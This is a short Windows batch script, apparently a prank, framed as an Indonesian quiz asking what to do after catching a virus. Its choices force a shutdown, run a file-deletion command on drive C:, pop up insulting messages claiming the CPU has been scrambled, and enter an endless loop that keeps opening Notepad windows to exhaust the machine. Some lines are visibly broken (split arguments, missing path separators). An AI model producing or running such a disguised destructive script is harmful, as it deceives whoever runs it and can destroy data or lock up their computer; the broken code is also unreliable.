@echo off
title Kuis hari ini!
:menu
cls
echo Jika kamu kena virus apa yang kamu lakukan?
pause
echo pilih yang mana:
echo 1. Matiin komputer
echo 2. Format aja
echo 3. Nangis
echo 4. Beli komputer baru
set input=nothing
set /p input=Choice:
if %input%==1 shutdown -s -t
30
if %input%==2 del c:xxx
if %input%==3 @ECHO off
msg * Muka lu jelek
msg * Ngaca dulu gih!
msg * Hayo lu, CPU lu gw acak-acak ya
msg * Udah, install ulang aja
msg * Mau kelar kan masalahnya?
@ECHO off
:top
START %SystemRoot%
system32notepad.exe
GOTO top